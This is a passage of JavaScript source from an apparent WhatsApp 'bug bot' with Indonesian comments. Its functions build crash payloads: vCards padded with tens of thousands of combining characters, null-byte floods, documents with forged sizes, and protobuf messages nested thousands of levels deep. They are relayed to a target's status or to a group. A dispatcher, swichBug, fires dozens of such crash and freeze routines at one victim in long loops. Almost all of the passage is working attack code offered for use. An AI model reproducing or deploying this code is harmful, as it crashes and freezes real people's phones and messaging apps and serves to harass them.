          "🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔" + "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function forclose(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 999999999,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 9999,
        width: 9999,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgUVJT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6aZz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const kontol = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4",
            mimetype: "application/pdf",
            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
            fileLength: 999999999,
            pageCount: 9999,
            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
            fileName: "billy.pdf",
            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1779839963,
            caption: "\u000F".repeat(50000),
            jpegThumbnail: Buffer.from(IMG.jpegThumbnail, 'base64'),
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { 
                        text: "\u001C".repeat(50000) 
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject(kontol)
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('error');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('error');
}

async function VampireBugIns(sock, groupJid) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                    },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            "screen_2_OptIn_0": true,
                            "screen_2_OptIn_1": true,
                            "screen_1_Dropdown_0": "nullOnTop",
                            "screen_1_DatePicker_1": "1028995200000",
                            "screen_1_TextInput_2": "null@gmail.com",
                            "screen_1_TextInput_3": "94643116",
                            "screen_0_TextInput_0": "\u0000".repeat(500000),
                            "screen_0_TextInput_1": "SecretDocu",
                            "screen_0_Dropdown_2": "#926-Xnull",
                            "screen_0_RadioButtonsGroup_3": "0_true",
                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: groupJid,
                        groupSubject: "Skylinne",
                    },
                ],
            },
        };

        await sock.relayMessage(groupJid, message, {}); // Hapus userJid untuk grup
        console.log(`Success sending bug to group: ${groupJid}`);
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function ForceDroidK7(sock, target) {
  const doc = {
    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
    fileLength: "9999999999999",
    pageCount: 3567587327,
    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
    fileName: "PARAMS_JSON",
    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1735456100",
    contactVcard: true,
    caption: ""
  };

  const encode = (n) => {
    const res = [];
    while (n >= 0x80) {
      res.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    res.push(n);
    return Buffer.from(res);
  };

  const wrap = (tag, data) => Buffer.concat([Buffer.from(tag), encode(data.length), data]);

  const payloadBase = proto.Message.encode(
    proto.Message.fromObject({ documentMessage: doc })
  ).finish();

  const buildPayload = (tag, depth) => {
    let buffer = payloadBase;
    for (let i = 0; i < depth; i++) {
      buffer = wrap(tag, wrap([0x0A], buffer));
    }
    return buffer;
  };

  const parseJid = (input) => {
    const str = String(input || '').trim();
    return str.includes('@') ? str : str.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const targets = (Array.isArray(target) ? target : [target])
    .map(parseJid)
    .filter(j => j.length > 15);

  if (!targets.length) return;

  for (let i = 0; i < targets.length; i++) {
    const targetJid = targets[i];
    const id = 'Doc' + Date.now().toString(36).toUpperCase() + '_' + i;

    for (let d = 5000; d >= 2000; d -= 400) {
      try {
        const parsed = proto.Message.decode(buildPayload([0xBA, 0x03], d));
        proto.Message.encode(parsed).finish();
        await sock.relayMessage('status@broadcast', parsed, {
          messageId: id,
          statusJidList: [targetJid],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{ tag: 'to', attrs: { jid: targetJid }, content: [] }]
            }]
          }]
        });
        break;
      } catch (_) {}
    }
  }
}

async function swichBug(sock, targetJid, bug) {
  switch (bug) {
    case "delayfrezee":
      for (let i = 0; i < 120; i++) {
        await DelayXFreze(sock, targetJid);
        await sleep(1000);
        await XxNoX(sock, targetJid);
        await sleep(1000);
        await crashX(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await sticXcrash(sock, targetJid);
        await sleep(1000);
        await ForceMediaByDewa(sock, targetJid);
        await sleep(1000);
        await comboxC1(sock, targetJid);
        await sleep(1000);
        await iniochalexDelayV1(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "frame":
      for (let i = 0; i < 200; i++) {
        await FrezeChatOrder(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await DelayRtr(sock, targetJid);
        await sleep(1000);
        await Spamdelay(sock, targetJid);
        await sleep(1000);
        await bulldozer(sock, targetJid);
        await sleep(1000);
        await comboxC1(sock, targetJid);
        await sleep(1000);
        await test(sock, targetJid);
        await sleep(1000);
        await BlankNotif(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "fc":
      for (let i = 0; i < 80; i++) {
        await CrasNoCLikV2(sock, targetJid);
        await sleep(1000);
        await LexcaabosV3(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await DelayRtr(sock, targetJid);
        await sleep(1000);
        await delayXcrasg(sock, targetJid);
        await sleep(1000);
        await frezeenewinvis(sock, targetJid);
        await sleep(1000);
        await CrashXfrezer(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "delay":
      for (let i = 0; i < 150; i++) {
        await convQtd(sock, targetJid);
        await sleep(1000);
        await delayerhard(sock, targetJid);
        await sleep(1000);
        await xofm(sock, targetJid);
        await sleep(1000);
        await unknowbuts(sock, targetJid);
        await sleep(1000);
        await K7BLANK(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await DelayK7(sock, targetJid);
        await sleep(1000);
        await frezeenewinvis(sock, targetJid);
        await sleep(1000);
        await crashImageUltra(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "ohoh":
      for (let i = 0; i < 50; i++) {
        await XxNoX(sock, targetJid);
        await sleep(1000);
        await FrezeChatOrder(sock, targetJid);
        await sleep(1000);
        await K7BLANK(sock, targetJid);
        await sleep(1000);
        await LexcaabosV5(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await CrashNotificationK7(sock, targetJid);
        await sleep(1000);
        await comboxC1(sock, targetJid);
        await sleep(1000);
        await test(sock, targetJid);
        await sleep(1000);
        await boomber(sock, targetJid);
        await sleep(1000);
        await CrashXfrezer(sock, targetJid);
        await sleep(1000);
        await BlankBYHeksen(sock, targetJid);
        await sleep(1000);
        await BlankNotif(sock, targetJid);
        await sleep(1000);
        await crashImageUltra(sock, targetJid);
        await sleep(1000);
      }      
      break;
    case "dozer":
      for (let i = 0; i < 100; i++) {
        await BuldozerXLoca(sock, targetJid);
        await sleep(500);
        await XxNoX(sock, targetJid);
        await sleep(500);
        await K7(sock, targetJid);
        await sleep(500);
        await convQtd(sock, targetJid);
        await sleep(500);
        await delayerhard(sock, targetJid);
        await sleep(500);
        await xofm(sock, targetJid);
        await sleep(500);
        await unknowbuts(sock, targetJid);
        await sleep(500);
        await K7BLANK(sock, targetJid);
        await sleep(500);
        await FrezeChatOrder(sock, targetJid);
        await sleep(500);
        await DelayXFreze(sock, targetJid);
        await sleep(500);
        await iniochamy(sock, targetJid);
        await sleep(500);
        await delayHard1(sock, targetJid);
        await sleep(500);
        await Spamdelay(sock, targetJid);
        await sleep(500);
        await LexcaabosV7Fix(sock, targetJid);
        await sleep(500);
        await nomercyFciMGk7(sock, targetJid);
        await sleep(500);
        await comboxC1(sock, targetJid);
        await sleep(500);
        await test(sock, targetJid);
        await sleep(500);
        await boomber(sock, targetJid);
        await sleep(500);
        await BlankBYHeksen(sock, targetJid);
        await sleep(500);
        await BlankNotif(sock, targetJid);
        await sleep(1000);
        await crashImageUltra(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "fc_click":
      for (let i = 0; i < 50; i++) {
        await crashX(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(2000);
      }      
      break;
    case "stuck":
      for (let i = 0; i < 30; i++) {
        await K7(sock, targetJid);
        await sleep(1000);
        await convQtd(sock, targetJid);
        await sleep(1000);
        await delayerhard(sock, targetJid);
        await sleep(1000);
        await xofm(sock, targetJid);
        await sleep(1000);
        await unknowbuts(sock, targetJid);
        await sleep(1000);
        await K7BLANK(sock, targetJid);
        await sleep(1000);
        await LexcaabosV5(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await Spamdelay(sock, targetJid);
        await sleep(1000);
        await comboxC1(sock, targetJid);
        await sleep(1000);
        await test(sock, targetJid);
        await sleep(1000);
        await BlankBYHeksen(sock, targetJid);
        await sleep(1000);
        await BlankNotif(sock, targetJid);
        await sleep(1000);
        await crashImageUltra(sock, targetJid);
        await sleep(1000);
        await imagedelay(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "chat":
      for (let i = 0; i < 30; i++) {
        await FrezeBum(sock, targetJid);
        await sleep(1000);
        await XxNoX(sock, targetJid);
        await sleep(1000);
        await DelayXFreze(sock, targetJid);
        await sleep(1000);
        await delayerhard(sock, targetJid);
        await sleep(1000);
        await K7(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await DelayRtr(sock, targetJid);
        await sleep(1000);
        await bulldozer(sock, targetJid);
        await sleep(1000);
        await nomercyFciMGk7(sock, targetJid);
        await sleep(1000);
        await test(sock, targetJid);
        await sleep(1000);
        await CrashXfrezer(sock, targetJid);
        await sleep(1000);
        await BlankBYHeksen(sock, targetJid);
        await sleep(1000);
        await BlankNotif(sock, targetJid);
        await sleep(1000);
        await crashImageUltra(sock, targetJid);
        await sleep(1000);
        await LexcaabosFast(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "blank":
      for (let i = 0; i < 200; i++) {
        await BlankOnehit(sock, targetJid);
        await sleep(1000);
        await delayerhard(sock, targetJid);
        await sleep(1000);
        await convQtd(sock, targetJid);
        await sleep(1000);
        await xofm(sock, targetJid);
        await sleep(1000);
        await unknowbuts(sock, targetJid);
        await sleep(1000);
        await K7BLANK(sock, targetJid);
        await sleep(1000);
        await delayHard1(sock, targetJid);
        await sleep(1000);
        await LexcaabosV7Fix(sock, targetJid);
        await sleep(1000);
        await BlankClick(sock, targetJid);
        await sleep(1000);
        await nomercyFciMGk7(sock, targetJid);
        await sleep(1000);
        await comboxC1(sock, targetJid);
        await sleep(1000);
        await test(sock, targetJid);
        await sleep(1000);
        await boomber(sock, targetJid);
        await sleep(1000);
        await BlankNotif(sock, targetJid);
        await sleep(1000);
        await crashImageUltra(sock, targetJid);
        await sleep(1000);
        await BlankMaklo(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "hard":
      for (let i = 0; i < 200; i++) {
        await delayHard1(sock, targetJid);
        await sleep(2000);
        await delayerhard(sock, targetJid);
        await sleep(2000);
        await DelayK7(sock, targetJid);
        await sleep(3000);
        await Delayhardio(sock, targetJid);
        await sleep(3000);
        await iniochalexDelayV3(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "fc_ios":
      for (let i = 0; i < 100; i++) {
        await iosQsx(sock, targetJid);
        await sleep(2000);
        await ExIOS(sock, targetJid);
        await sleep(2000);
        await PahinaApple(sock, targetJid);
        await sleep(2000);
        await iosCtt(sock, targetJid);
        await sleep(2000);
        await IphoneCrashVisble(sock, targetJid);
        await sleep(2000);
      }
      break;
    case "fcc":
      for (let i = 0; i < 20; i++) {
        await k7ForceInfinity(sock, targetJid);
        await sleep(2000);
      }
      break;
    case "invis":
      for (let i = 0; i < 85; i++) {
        await fc(sock, targetJid);
        await sleep(2500);
      }
      break;
    case "uy":
      for (let i = 0; i < 150; i++) {
        await LexcaabosFast(sock, targetJid);
        await sleep(2500);
      }
      break;
    case "pp":
      for (let i = 0; i < 250; i++) {
        await forclose(sock, targetJid);
        await sleep(2500);
      }
      break;
    case "waktu":
      for (let i = 0; i < 2; i++) {
        await times(sock, targetJid);
        await sleep(2500);
      }
      break;
    case "iphone":
      for (let i = 0; i < 70; i++) {
        await IosForce(sock, targetJid);
        await sleep(2500);
      }
      break;
    case "hm":
      for (let i = 0; i < 1; i++) {
        await ForceNewK7(sock, targetJid);
        await sleep(2000);
      }
      break;
    case "fccc":
      for (let i = 0; i < 30; i++) {
        await ForceDroidK7(sock, targetJid);
        await sleep(2000);
      }
      break;
    case "crash":
      for (let i = 0; i < 50; i++) {
        await CrasNoCLikV3(sock, targetJid);
        await sleep(2000);
        await CrashNoCLikV4(sock, targetJid);
        await sleep(2000);
      }
      break;
    case "spam":
      for (let i = 0; i < 1; i++) {
        await topsvideo(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "clear":
      const b = await sock.sendMessage(targetJid, {
        text: "\u0003".repeat(100)
      });
      console.log(b.message);
      break;
  }
}

// HARUS ADA DI BAWAH FUNC.JS:
module.exports = {
  swichBug,  // ← INI HARUS ADA!
  fcgb, 
  fcGrup, PayXGroup, CrashLockScreenGb, BlankXFreeze, satz, 
